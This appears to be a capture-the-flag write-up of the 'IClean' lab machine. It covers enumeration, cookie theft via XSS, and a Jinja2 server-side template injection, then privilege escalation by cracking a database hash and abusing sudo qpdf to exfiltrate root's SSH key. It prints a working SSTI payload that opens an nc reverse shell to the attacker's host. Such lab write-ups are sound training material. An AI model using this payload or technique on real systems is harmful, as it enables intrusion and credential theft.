# IClean

<figure><img src="../../.gitbook/assets/IClean (1).png" alt=""><figcaption></figcaption></figure>

## Enumeration

```bash
Nmap scan report for iclean.htb (10.10.11.12)
Host is up (0.048s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA)
|_  256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.52 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=4/22%OT=22%CT=1%CU=36432%PV=Y%DS=2%DC=T%G=Y%TM=6626
OS:87C6%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)
OS:OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53C
OS:ST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
OS:ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
OS:%CD=S)

Uptime guess: 39.418 days (since Thu Mar 14 01:51:02 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT      ADDRESS
1   47.67 ms 10.10.14.1
2   48.32 ms iclean.htb (10.10.11.12)

NSE: Script Post-scanning.
Initiating NSE at 11:52
Completed NSE at 11:52, 0.00s elapsed
Initiating NSE at 11:52
Completed NSE at 11:52, 0.00s elapsed
Initiating NSE at 11:52
Completed NSE at 11:52, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.37 seconds
           Raw packets sent: 65963 (2.906MB) | Rcvd: 65699 (2.631MB)

```

### HTTP (80)

If we try to visit the `http://iclean.htb` page we're redirected to `http://capiclean.htb`:

<figure><img src="../../.gitbook/assets/image (156).png" alt=""><figcaption></figcaption></figure>

Add this FQDN to `/etc/hosts` and retry to navigate the webpage:

<figure><img src="../../.gitbook/assets/image (157).png" alt=""><figcaption></figcaption></figure>

At `/team` page we can have info disclosure about possible employee's names/usernames:

<figure><img src="../../.gitbook/assets/image (158).png" alt=""><figcaption></figcaption></figure>

We have also to analyze a login page with a form at `/login`:

<figure><img src="../../.gitbook/assets/image (160).png" alt=""><figcaption></figcaption></figure>

The directory listing using FFUF show us a `/dashboard` with a `302 - Redirect` to homepage and a `/server-status` with response code `403 - Forbidden`:

<figure><img src="../../.gitbook/assets/image (576).png" alt=""><figcaption></figcaption></figure>

There is also another interesting page `/quote` about a kind of page to request a quote:

<figure><img src="../../.gitbook/assets/image (577).png" alt=""><figcaption></figcaption></figure>

That send the POST request to `/sendMessage` endpoint:

<figure><img src="../../.gitbook/assets/image (578).png" alt=""><figcaption></figcaption></figure>

Intercepting the POST request in BurpSuite we obtain this one:

<figure><img src="../../.gitbook/assets/image (579).png" alt=""><figcaption></figcaption></figure>

## Exploitation (foothold)

If there is a contact form, it is possible that the submitted requests will be monitored by some site administrator user. We can see if the form is vulnerable to an XSS...

<figure><img src="../../.gitbook/assets/image (581).png" alt=""><figcaption></figcaption></figure>

Using the stealed cookie and Cookie-Editor Firefox Plugin we can now access the `/dashboard` page which previously returned a `403 - Forbidden`:

<figure><img src="../../.gitbook/assets/image (582).png" alt=""><figcaption></figcaption></figure>

As you can see, several features can be accessed including generating an invoice:

<figure><img src="../../.gitbook/assets/image (590).png" alt=""><figcaption></figcaption></figure>

Intercepting in BurpSuite:

<figure><img src="../../.gitbook/assets/image (589).png" alt=""><figcaption></figcaption></figure>

And some QR code to view it via the web:

<figure><img src="../../.gitbook/assets/image (591).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (592).png" alt=""><figcaption></figcaption></figure>

Then the backend return to us a QR Code link:

<figure><img src="../../.gitbook/assets/image (585).png" alt=""><figcaption></figcaption></figure>

Submitting the QR Code link:

<figure><img src="../../.gitbook/assets/image (593).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (594).png" alt=""><figcaption></figcaption></figure>

It appears that the fields entered within the invoice generation are not then rendered in the generated HTML:

<figure><img src="../../.gitbook/assets/image (586).png" alt=""><figcaption></figcaption></figure>

The QR Code that we see in Web-version invoice in right-bottom is represented as base64 encoded image as showed by BurpSuite and <mark style="color:yellow;">**seems to be the only one input reflected in the server’s response**</mark>:

<figure><img src="../../.gitbook/assets/image (595).png" alt=""><figcaption></figcaption></figure>

If we try to change the value of this parameter we see that the response change in consistent way...

<figure><img src="../../.gitbook/assets/image (597).png" alt=""><figcaption></figcaption></figure>

But things get interesting when we notice that by trying to inject template syntax, it is evaluated by the server:

<figure><img src="../../.gitbook/assets/image (596).png" alt=""><figcaption></figcaption></figure>

We have in this case a Server-Side Template Injection (SSTI). Considering that the backend language obtained from the previous enumeration step turns out to be Python it is likely that we are working with Jinja2 or Mako.

<figure><img src="../../.gitbook/assets/image (587).png" alt=""><figcaption></figcaption></figure>

The classic SSTI JInja2 exploit tecniques seems to not work, so searching on the Web i've found this [article](https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/?source=post_page-----cfc46f351353--------------------------------) about bypassing restriction.&#x20;

After checking for python and its version and after trying different type of reverse shells:

<figure><img src="../../.gitbook/assets/image (588).png" alt=""><figcaption></figcaption></figure>

I've used the following POST body request:

{% code overflow="wrap" %}
```
invoice_id=&form_type=scannable_invoice&qr_link={{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/bash+-i+2>%261|nc+10.10.15.101+6060+>/tmp/f")|attr("read")()}}
```
{% endcode %}

And using the magic pwncat-cs finally we obtain a reverse shell:

<figure><img src="../../.gitbook/assets/image (598).png" alt=""><figcaption></figcaption></figure>

Inside the app.py file we find DB credentials (iclean:pxCsmnGLckUb):

<figure><img src="../../.gitbook/assets/image (599).png" alt=""><figcaption></figcaption></figure>

Viewing the /etc/passwd file, we have confirmation that there is a mysql server and a user named `consuela`:

<figure><img src="../../.gitbook/assets/image (600).png" alt=""><figcaption></figcaption></figure>

## Privilege escalation (user)

Enumerating and accessing mysql with the credentials found we see that there is a `user` table having 2 census users: `admin` and `consuela`

<figure><img src="../../.gitbook/assets/image (153).png" alt=""><figcaption></figcaption></figure>

```
mysql> select * from users;
+----+----------+------------------------------------------------------------------+----------------------------------+
| id | username | password                                                         | role_id                          |
+----+----------+------------------------------------------------------------------+----------------------------------+
|  1 | admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 | 21232f297a57a5a743894a0e4a801fc3 |
|  2 | consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa | ee11cbb19052e40b07aac0ca060c23ee |
+----+----------+------------------------------------------------------------------+----------------------------------+
```

Try to cracking the admin password we will not obtain any result instead the consuela password is in our wordlist and so we obtain it:

<figure><img src="../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

Logging using SSH as `consuela` user, we obtain the user flag:

<figure><img src="../../.gitbook/assets/image (155).png" alt=""><figcaption></figcaption></figure>

## Privilege escalation (root)

As a first attempt we type the classic `sudo -l` to see what commands we are allowed to execute as root:

<figure><img src="../../.gitbook/assets/image (144).png" alt=""><figcaption></figcaption></figure>

It would appear to be a [tool](https://github.com/qpdf/qpdf) for managing and creating/editing pdfs from the command line.

Searching GTFObins or the Internet, there appears to be no standard technique for privilege escalation exploiting this binary.

Analyzing in more detail the features offered by this tool the most interesting ones turn out to be the following:

<figure><img src="../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

The basic parameters to be used involve an input file and an output file. However, there is a `--empty` option that saves us from having to bring a dummy PDF file to the victim machine by using a blank PDF as input instead:

<figure><img src="../../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

There doesn't seem to be the ability to run commands so the fastest way turns out to be to read the root user's SSH private key and add to PDF as attachment, which is possible to do since we can run qpdf as administrative users.

Since we cannot view the file with a graphical PDF Viewer we have to use the option `--qdf`:

<figure><img src="../../.gitbook/assets/image (149).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>

Analyzing the entire generated PDF we notice that the root SSH key has been added as an attachment and we can now use it to log in via SSH:

<figure><img src="../../.gitbook/assets/image (151).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (152).png" alt=""><figcaption></figcaption></figure>
